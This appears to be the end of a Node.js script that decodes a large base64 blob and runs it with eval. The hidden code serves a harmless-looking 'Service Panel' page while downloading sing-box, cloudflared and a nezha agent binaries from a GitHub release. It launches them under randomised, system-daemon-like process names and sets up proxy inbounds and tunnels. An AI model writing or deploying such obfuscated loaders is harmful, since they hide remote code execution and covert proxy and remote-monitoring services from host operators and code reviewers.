cmRlci1yYWRpdXM6MTVweDtib3gtc2hhZG93OjBceDIwMTBweFx4MjAzMHB4XHgyMHJnYmEoMCwwLDAsMC4yKTttYXgtd2lkdGg6NTAwcHg7bWFyZ2luOjIwcHh9XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBoMXtjb2xvcjojMzMzO2ZvbnQtc2l6ZToyLjVlbTttYXJnaW4tYm90dG9tOjIwcHg7Zm9udC13ZWlnaHQ6MzAwfVx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwcHtjb2xvcjojNjY2O2ZvbnQtc2l6ZToxLjJlbTtsaW5lLWhlaWdodDoxLjY7bWFyZ2luLWJvdHRvbTozMHB4fVx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwLmljb257Zm9udC1zaXplOjRlbTttYXJnaW4tYm90dG9tOjIwcHg7Y29sb3I6IzY2N2VlYTtmb250LXdlaWdodDpib2xkfVx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwLmZvb3Rlcntjb2xvcjojOTk5O2ZvbnQtc2l6ZTowLjllbTttYXJnaW4tdG9wOjMwcHh9XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjAubmF2LWxpbmtze21hcmdpbi10b3A6MzBweH1ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMC5uYXYtbGlua3NceDIwYXtkaXNwbGF5OmlubGluZS1ibG9jazttYXJnaW46MFx4MjAxMHB4O3BhZGRpbmc6MTBweFx4MjAyMHB4O2JhY2tncm91bmQ6IzY2N2VlYTtjb2xvcjp3aGl0ZTt0ZXh0LWRlY29yYXRpb246bm9uZTtib3JkZXItcmFkaXVzOjVweDt0cmFuc2l0aW9uOmJhY2tncm91bmRceDIwMC4zc31ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMC5uYXYtbGlua3NceDIwYTpob3ZlcntiYWNrZ3JvdW5kOiM1YTY3ZDh9XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDwvc3R5bGU+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPC9oZWFkPlx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDxib2R5Plx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjA8ZGl2XHgyMGNsYXNzPVx4MjJjb250YWluZXJceDIyPlx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPGRpdlx4MjBjbGFzcz1ceDIyaWNvblx4MjI+WyFdPC9kaXY+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjA8aDE+U2VydmljZVx4MjBQYW5lbDwvaDE+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjA8cD5NdWx0aS1wcm90b2NvbFx4MjBzZXJ2aWNlXHgyMG1hbmFnZW1lbnRceDIwcGFuZWwuPC9wPlx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPGRpdlx4MjBjbGFzcz1ceDIybmF2LWxpbmtzXHgyMj5ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjA8YVx4MjBocmVmPVx4MjIvc3RhdHVzXHgyMj5WaWV3XHgyMFN0YXR1czwvYT5ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDwvZGl2Plx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPGRpdlx4MjBjbGFzcz1ceDIyZm9vdGVyXHgyMj5TZXJ2aWNlXHgyME1hbmFnZW1lbnRceDIwUGFuZWw8L2Rpdj5ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPC9kaXY+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPC9ib2R5Plx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDwvaHRtbD5ceDBhXHgyMFx4MjBceDIwXHgyMCcsJ3h0bHMtcnByeC12aXNpb24nLCctLXJlZ2lvbicsJ3N0b3BwZWQnLCd2bWVzcy1pbicsJ25lemhhJywnYmFzZTY0JywnP2Nvbmdlc3Rpb25fY29udHJvbD1jdWJpYyZ1ZHBfcmVsYXlfbW9kZT1uYXRpdmUmYWxwbj1oMyxzcGR5LzMuMSZhbGxvd19pbnNlY3VyZT0xI1RVSUMnLCdSRUFMSVRZX1BPUlQnLCc0Njg3OTk4U0hvalNZJywnUkVBTElUWV9QVUJMSUNfS0VZJywnXHgyNykudGhlbigoKT0+YWxlcnQoXHgyN0NvcGllZFx4MjAnLCdmbG9vcicsJ3NpbGVudCcsJ1BPUlQnLCdyYW5kb21CeXRlcycsJ1x4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDwvZGl2Plx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPC9kaXY+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDxkaXZceDIwY2xhc3M9XHgyMmluZm8taXRlbVx4MjI+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPGRpdlx4MjBjbGFzcz1ceDIybGFiZWxceDIyPlNlcnZlclx4MjBJUDo8L2Rpdj5ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjA8ZGl2XHgyMGNsYXNzPVx4MjJ2YWx1ZVx4MjI+JywnbWF0Y2gnLCdIWTJfU05JJywnQ19EJywnd3JpdGVGaWxlU3luYycsJ3J1bm5pbmcnLCdtb25nb2QnLCdzdGRvdXQnLCdtYXAnLCctLW5vLWF1dG91cGRhdGUnLCc8L2Rpdj48L2Rpdj4nLCdhcHBsaWNhdGlvbi9qc29uJywncmVhbGl0eS1pbicsJ1ZNRVNTX1VVSUQnLCdnZXQnLCdmcm9tJywnaHlzdGVyaWEyOi8vJywncHVzaCcsJ2NyeXB0bycsJ0hZMl9QQVNTV09SRCcsJy9zdGF0dXMnLCdkYnVzLWRhZW1vbicsJzxkaXZceDIwY2xhc3M9XHgyMnBvcnQtaXRlbVx4MjI+PGRpdlx4MjBjbGFzcz1ceDIycG9ydC1sYWJlbFx4MjI+VFVJQzwvZGl2PjxkaXZceDIwY2xhc3M9XHgyMnBvcnQtdmFsdWVceDIyPicsJ2lnbm9yZScsJzxkaXZceDIwY2xhc3M9XHgyMnBvcnQtaXRlbVx4MjI+PGRpdlx4MjBjbGFzcz1ceDIycG9ydC1sYWJlbFx4MjI+UmVhbGl0eTwvZGl2PjxkaXZceDIwY2xhc3M9XHgyMnBvcnQtdmFsdWVceDIyPicsJyZmcD1jaHJvbWUmcGJrPScsJ1JFQUxJVFlfU0hPUlRfSUQnLCczM1BBcUdYUScsJ3N5c2xvZ2QnLCd1cGdyYWRlJywnMzI5MFJJWXlkUycsJzE1MFpQVExtcCddO18weDViNmM9ZnVuY3Rpb24oKXtyZXR1cm4gXzB4MzA2NzAyO307cmV0dXJuIF8weDViNmMoKTt9YXN5bmMgZnVuY3Rpb24gc3RhcnRTZXJ2aWNlKF8weDVjNDIyMCxfMHgyM2QwYjksXzB4NTRiZmU3LF8weDZmNDU4MD17fSl7Y29uc3QgXzB4NTQxNTJhPV8weDFhOTFhNzt0cnl7Y29uc3QgXzB4MjdkYmFhPXNwYXduKF8weDVjNDIyMCxfMHgyM2QwYjkseydzdGRpbyc6W18weDU0MTUyYSgweDFlNSksJ3BpcGUnLF8weDU0MTUyYSgweDE4MSldLC4uLl8weDZmNDU4MH0pO2lmKF8weDZmNDU4MFtfMHg1NDE1MmEoMHgxYWUpXSl7Y29uc3QgXzB4NDlkNGQyPWZzW18weDU0MTUyYSgweDE5MSldKF8weDZmNDU4MFtfMHg1NDE1MmEoMHgxYWUpXSk7XzB4MjdkYmFhW18weDU0MTUyYSgweDFkNSldW18weDU0MTUyYSgweDE4MSldKF8weDQ5ZDRkMiksXzB4MjdkYmFhW18weDU0MTUyYSgweDEyOSldWydwaXBlJ10oXzB4NDlkNGQyKTt9cmV0dXJuIHNlcnZpY2VTdGF0dXNbXzB4NTRiZmU3Wyd0b0xvd2VyQ2FzZSddKCldPV8weDU0MTUyYSgweDFkMyksXzB4MjdkYmFhWydvbiddKCdzcGF3bicsKCk9Pntjb25zdCBfMHhjNDZmNTI9XzB4NTQxNTJhO3NlcnZpY2VTdGF0dXNbXzB4NTRiZmU3Wyd0b0xvd2VyQ2FzZSddKCldPV8weGM0NmY1MigweDFkMyk7fSksXzB4MjdkYmFhWydvbiddKCdlcnJvcicsKCk9PntzZXJ2aWNlU3RhdHVzW18weDU0YmZlN1sndG9Mb3dlckNhc2UnXSgpXT0nZXJyb3InO30pLF8weDI3ZGJhYVsnb24nXShfMHg1NDE1MmEoMHgxNWIpLCgpPT57Y29uc3QgXzB4YzU2MzVkPV8weDU0MTUyYTtzZXJ2aWNlU3RhdHVzW18weDU0YmZlN1tfMHhjNTYzNWQoMHgxMjcpXSgpXT1fMHhjNTYzNWQoMHgxYzEpO30pLG5ldyBQcm9taXNlKF8weDIwMWQ3ND0+e2NvbnN0IF8weDI3YjFmMD0oKT0+e2NvbnN0IF8weDNlZjliMj1fMHg1YTc4O18weDI3ZGJhYVsna2lsbGVkJ10/KHNlcnZpY2VTdGF0dXNbXzB4NTRiZmU3Wyd0b0xvd2VyQ2FzZSddKCldPV8weDNlZjliMigweDFjMSksXzB4MjAxZDc0KG51bGwpKToocHJvY2Vzc2VzWydwdXNoJ10oXzB4MjdkYmFhKSxfMHgyMDFkNzQoXzB4MjdkYmFhKSk7fTtzZXRUaW1lb3V0KF8weDI3YjFmMCwweDdkMCk7fSk7fWNhdGNoKF8weDEyMDA5ZSl7cmV0dXJuIHNlcnZpY2VTdGF0dXNbXzB4NTRiZmU3W18weDU0MTUyYSgweDEyNyldKCldPV8weDU0MTUyYSgweDFiYSksbnVsbDt9fWNvbnN0IGFwcD1leHByZXNzKCk7YXBwW18weDFhOTFhNygweDFkYyldKCcvJywoXzB4MzZlYzdlLF8weDhmNDUxZSk9Pntjb25zdCBfMHgyNmNkYTA9XzB4MWE5MWE3O18weDhmNDUxZVtfMHgyNmNkYTAoMHgxYTkpXSgweGM4LHsnQ29udGVudC1UeXBlJzpfMHgyNmNkYTAoMHgxNWUpfSksXzB4OGY0NTFlW18weDI2Y2RhMCgweDE0MildKEhUTUxfVEVNUExBVEVTW18weDI2Y2RhMCgweDFiNildKTt9KSxhcHBbXzB4MWE5MWE3KDB4MWRjKV0oXzB4MWE5MWE3KDB4MWUyKSxhc3luYyhfMHg0ZjU2OWIsXzB4M2Q2MDk1KT0+e2NvbnN0IF8weDU1YTc0OD1fMHgxYTkxYTcsXzB4MjYyZjg5PWF3YWl0IGdldFNlcnZlcklQKCksXzB4MjZkYmFkPWdlbmVyYXRlTGlua3MoXzB4MjYyZjg5KTtfMHgzZDYwOTVbXzB4NTVhNzQ4KDB4MWE5KV0oMHhjOCx7J0NvbnRlbnQtVHlwZSc6J3RleHQvaHRtbCd9KSxfMHgzZDYwOTVbXzB4NTVhNzQ4KDB4MTQyKV0oSFRNTF9URU1QTEFURVNbXzB4NTVhNzQ4KDB4MTMxKV0oXzB4MjYyZjg5LF8weDI2ZGJhZCkpO30pLGFwcFsnZ2V0J10oJy94Jyxhc3luYyhfMHgzMGNiMDcsXzB4MTQ5MjEwKT0+e2NvbnN0IF8weDU2Y2EzNj1fMHgxYTkxYTcsXzB4NTg2ZDY4PWF3YWl0IGdldFNlcnZlcklQKCksXzB4NWUwMzAyPWdlbmVyYXRlTGlua3MoXzB4NTg2ZDY4KTtfMHgxNDkyMTBbXzB4NTZjYTM2KDB4MWE5KV0oMHhjOCx7J0NvbnRlbnQtVHlwZSc6XzB4NTZjYTM2KDB4MTVlKX0pLF8weDE0OTIxMFtfMHg1NmNhMzYoMHgxNDIpXShIVE1MX1RFTVBMQVRFU1tfMHg1NmNhMzYoMHgxMzEpXShfMHg1ODZkNjgsXzB4NWUwMzAyKSk7fSksYXBwWydnZXQnXSgnL2hlYWx0aCcsKF8weDE3YzBhNSxfMHg1NjZlMzMpPT57Y29uc3QgXzB4NGE4MzU5PV8weDFhOTFhNztfMHg1NjZlMzNbJ3dyaXRlSGVhZCddKDB4YzgseydDb250ZW50LVR5cGUnOl8weDRhODM1OSgweDFkOSl9KSxfMHg1NjZlMzNbXzB4NGE4MzU5KDB4MTQyKV0oSlNPTltfMHg0YTgzNTkoMHgxNjIpXSh7J3N0YXR1cyc6J29rJywndXB0aW1lJzpwcm9jZXNzWyd1cHRpbWUnXSgpfSkpO30pO2NvbnN0IHNlcnZlcj1odHRwW18weDFhOTFhNygweDFiZCldKGFwcCk7c2VydmVyWydvbiddKF8weDFhOTFhNygweDEyMiksY3JlYXRlUHJveHlNaWRkbGV3YXJlKHsndGFyZ2V0JzpfMHgxYTkxYTcoMHgxOWUpK0NPTkZJR1snVk1FU1NfUE9SVCddLCdjaGFuZ2VPcmlnaW4nOiEhW10sJ3dzJzohIVtdLCdsb2dMZXZlbCc6XzB4MWE5MWE3KDB4MWNiKX0pKTthc3luYyBmdW5jdGlvbiBtYWluKCl7Y29uc3QgXzB4ZTdhNmM5PV8weDFhOTFhNztzZXJ2ZXJbXzB4ZTdhNmM5KDB4MWFmKV0oQ09ORklHWydQT1JUJ10sKCk9Pntjb25zdCBfMHgxYmVmNDE9XzB4ZTdhNmM5O3NlcnZpY2VTdGF0dXNbXzB4MWJlZjQxKDB4MTZjKV09XzB4MWJlZjQxKDB4MWQzKTt9KTt0cnl7Y29uc3QgXzB4NWVkNTg3PWRldGVjdEFyY2goKSxfMHhjZjRlZWM9XzB4NWVkNTg3PT09XzB4ZTdhNmM5KDB4MTNjKSxfMHg0OTg4ODE9Z2V0UmFuZG9tUHJvY2Vzc05hbWUoKSxfMHg1YmFlZWY9Z2V0UmFuZG9tUHJvY2Vzc05hbWUoKSxfMHgxZTc3ZTM9Z2V0UmFuZG9tUHJvY2Vzc05hbWUoKSxfMHgyNDdkNTg9cGF0aFtfMHhlN2E2YzkoMHgxOGIpXShXT1JLX0RJUixfMHg0OTg4ODEpLF8weDRmNTNmZj1wYXRoW18weGU3YTZjOSgweDE4YildKFdPUktfRElSLF8weDViYWVlZiksXzB4NGI3MjJlPXBhdGhbXzB4ZTdhNmM5KDB4MThiKV0oV09SS19ESVIsXzB4MWU3N2UzKSxfMHgxMzE2ZWY9eydzaW5nYm94JzpfMHhjZjRlZWM/XzB4ZTdhNmM5KDB4MWFiKTonaHR0cHM6Ly9naXRodWIuY29tL3NlYXYxL2RsL3JlbGVhc2VzL2Rvd25sb2FkL2ZpbGVzL3NiJywnY2xvdWRmbGFyZWQnOl8weGNmNGVlYz8naHR0cHM6Ly9naXRodWIuY29tL3NlYXYxL2RsL3JlbGVhc2VzL2Rvd25sb2FkL2ZpbGVzL2NmLWFybSc6XzB4ZTdhNmM5KDB4MWIzKSwnbmV6aGEnOl8weGNmNGVlYz8naHR0cHM6Ly9naXRodWIuY29tL3NlYXYxL2RsL3JlbGVhc2VzL2Rvd25sb2FkL2ZpbGVzL256LWFybSc6XzB4ZTdhNmM5KDB4MTVkKX07YXdhaXQgUHJvbWlzZVtfMHhlN2E2YzkoMHgxNzQpXShbZG93bmxvYWRCaW5hcnkoXzB4MTMxNmVmW18weGU3YTZjOSgweDE0ZSldLF8weDI0N2Q1OCksZG93bmxvYWRCaW5hcnkoXzB4MTMxNmVmW18weGU3YTZjOSgweDEzNyldLF8weDRmNTNmZiksZG93bmxvYWRCaW5hcnkoXzB4MTMxNmVmW18weGU3YTZjOSgweDFjMyldLF8weDRiNzIyZSldKSxbXzB4MjQ3ZDU4LF8weDRmNTNmZixfMHg0YjcyMmVdW18weGU3YTZjOSgweDEzYildKF8weDVmMDQyYz0+e2NvbnN0IF8weDE5MjBiND1fMHhlN2E2Yzk7aWYoIWZzW18weDE5MjBiNCgweDE5NCldKF8weDVmMDQyYykpdGhyb3cgbmV3IEVycm9yKCfmlofku7bmnKrmib7liLA6XHgyMCcrXzB4NWYwNDJjKTt9KTtjb25zdCBfMHgyY2Y3Yzc9YXdhaXQgZ2V0U2VydmVySVAoKTtpZihDT05GSUdbJ0hZMl9QT1JUJ118fENPTkZJR1tfMHhlN2E2YzkoMHgxNjYpXXx8Q09ORklHWydSRUFMSVRZX1BPUlQnXXx8Q09ORklHW18weGU3YTZjOSgweDE3ZSldKXthd2FpdCBnZW5lcmF0ZVJlYWxpdHlLZXlzKF8weDI0N2Q1OCk7Y29uc3QgXzB4NWViMDM2PWF3YWl0IGdlbmVyYXRlU2luZ0JveENvbmZpZygpO3RyeXthd2FpdCBuZXcgUHJvbWlzZSgoXzB4MzlhMjMyLF8weDFmYWE2MCk9Pntjb25zdCBfMHgyYjhiMzk9XzB4ZTdhNmM5O2V4ZWMoJ1x4MjInK18weDI0N2Q1OCtfMHgyYjhiMzkoMHgxN2MpK18weDVlYjAzNisnXHgyMicsXzB4MjhlNTBlPT57XzB4MjhlNTBlP18weDFmYWE2MChfMHgyOGU1MGUpOl8weDM5YTIzMigpO30pO30pLGF3YWl0IHN0YXJ0U2VydmljZShfMHgyNDdkNTgsW18weGU3YTZjOSgweDE2MyksJy1jJyxfMHg1ZWIwMzZdLF8weGU3YTZjOSgweDE0ZSkpO31jYXRjaChfMHgyOGJiMTQpe3NlcnZpY2VTdGF0dXNbXzB4ZTdhNmM5KDB4MTRlKV09XzB4ZTdhNmM5KDB4MWJhKTt9fWlmKENPTkZJR1tfMHhlN2E2YzkoMHgxNTIpXSl0cnl7Y29uc3QgXzB4NDRjZDhkPVtfMHhlN2E2YzkoMHgxODcpLCctLWVkZ2UtaXAtdmVyc2lvbicsXzB4ZTdhNmM5KDB4MTQ3KSwnLS1wcm90b2NvbCcsXzB4ZTdhNmM5KDB4MTliKSxfMHhlN2E2YzkoMHgxYzApLCd1cycsXzB4ZTdhNmM5KDB4MWQ3KSxfMHhlN2E2YzkoMHgxNjMpLF8weGU3YTZjOSgweDE0NCksQ09ORklHW18weGU3YTZjOSgweDE1MildLCctLXVybCcsXzB4ZTdhNmM5KDB4MTMyKStDT05GSUdbXzB4ZTdhNmM5KDB4MWNjKV1dO2F3YWl0IHN0YXJ0U2VydmljZShfMHg0ZjUzZmYsXzB4NDRjZDhkLCdjbG91ZGZsYXJlZCcpO31jYXRjaChfMHgxZDkzY2Upe3NlcnZpY2VTdGF0dXNbXzB4ZTdhNmM5KDB4MTM3KV09XzB4ZTdhNmM5KDB4MWJhKTt9ZWxzZXtpZihDT05GSUdbXzB4ZTdhNmM5KDB4MTY2KV0pe2NvbnN0IF8weDFhMDJhZj1hd2FpdCBzdGFydFRlbXBUdW5uZWwoXzB4NGY1M2ZmLENPTkZJR1tfMHhlN2E2YzkoMHgxY2MpXSk7IV8weDFhMDJhZiYmKHNlcnZpY2VTdGF0dXNbXzB4ZTdhNmM5KDB4MTM3KV09J2Vycm9yJyk7fX1pZihDT05GSUdbXzB4ZTdhNmM5KDB4MTc5KV0mJkNPTkZJR1snTl9LJ10pe2NvbnN0IF8weDQyNjIxZT1bJy1zJyxDT05GSUdbXzB4ZTdhNmM5KDB4MTc5KV0rJzonK0NPTkZJR1tfMHhlN2E2YzkoMHgxNTMpXSwnLXAnLCcnK0NPTkZJR1tfMHhlN2E2YzkoMHgxODgpXSxfMHhlN2E2YzkoMHgxNWMpLCczJyxfMHhlN2E2YzkoMHgxYTApXTsoQ09ORklHW18weGU3YTZjOSgweDE3NildPT09XzB4ZTdhNmM5KDB4MTkwKXx8dHlwZW9mIENPTkZJR1tfMHhlN2E2YzkoMHgxNzYpXT09PSdzdHJpbmcnJiZDT05GSUdbXzB4ZTdhNmM5KDB4MTc2KV1bXzB4ZTdhNmM5KDB4MTNlKV0oJy0tdGxzJykpJiZfMHg0MjYyMWVbXzB4ZTdhNmM5KDB4MWRmKV0oXzB4ZTdhNmM5KDB4MTkwKSk7dHJ5e2F3YWl0IHN0YXJ0U2VydmljZShfMHg0YjcyMmUsXzB4NDI2MjFlLF8weGU3YTZjOSgweDFjMykseydsb2dGaWxlJzpwYXRoW18weGU3YTZjOSgweDE4YildKFdPUktfRElSLF8weGU3YTZjOSgweDE2YikpfSk7fWNhdGNoKF8weGFmMTk0YSl7c2VydmljZVN0YXR1c1snbmV6aGEnXT1fMHhlN2E2YzkoMHgxYmEpO319c2V0SW50ZXJ2YWwoKCk9Pntjb25zdCBfMHgxMDZmMTc9XzB4ZTdhNmM5O3Byb2Nlc3Nlc1tfMHgxMDZmMTcoMHgxM2IpXShfMHgyYTFmNTA9Pntjb25zdCBfMHgxZTM3MGI9XzB4MTA2ZjE3O2lmKF8weDJhMWY1MFsna2lsbGVkJ10pe2NvbnN0IF8weDE3MDQ3Yj1PYmplY3RbXzB4MWUzNzBiKDB4MTY0KV0oc2VydmljZVN0YXR1cylbJ2ZpbmQnXShfMHgxOWRlZGE9PnNlcnZpY2VTdGF0dXNbXzB4MTlkZWRhXT09PV8weDFlMzcwYigweDFkMykmJiFwcm9jZXNzZXNbJ3NvbWUnXShfMHg0MGNhNGM9Pl8weDQwY2E0YyE9PV8weDJhMWY1MCYmIV8weDQwY2E0Y1tfMHgxZTM3MGIoMHgxNzgpXSkpO18weDE3MDQ3YiYmKHNlcnZpY2VTdGF0dXNbXzB4MTcwNDdiXT0nc3RvcHBlZCcpO319KSxwcm9jZXNzZXNbJ2xlbmd0aCddPjB4MCYmcHJvY2Vzc2VzW18weDEwNmYxNygweDE1ZildKF8weDMzNTM1NT0+XzB4MzM1MzU1W18weDEwNmYxNygweDE3OCldKSYmY2xlYW51cCgpO30sMHgyNzEwKSxwcm9jZXNzWydvbiddKF8weGU3YTZjOSgweDFhMyksY2xlYW51cCkscHJvY2Vzc1snb24nXShfMHhlN2E2YzkoMHgxYjUpLGNsZWFudXApO31jYXRjaChfMHg1NDhiZjkpe3Byb2Nlc3NbXzB4ZTdhNmM5KDB4MTViKV0oMHgxKTt9fW1haW4oKVsnY2F0Y2gnXSgoKT0+cHJvY2Vzc1snZXhpdCddKDB4MSkpOw==';
const code = Buffer.from(b, 'base64').toString();
eval(code);
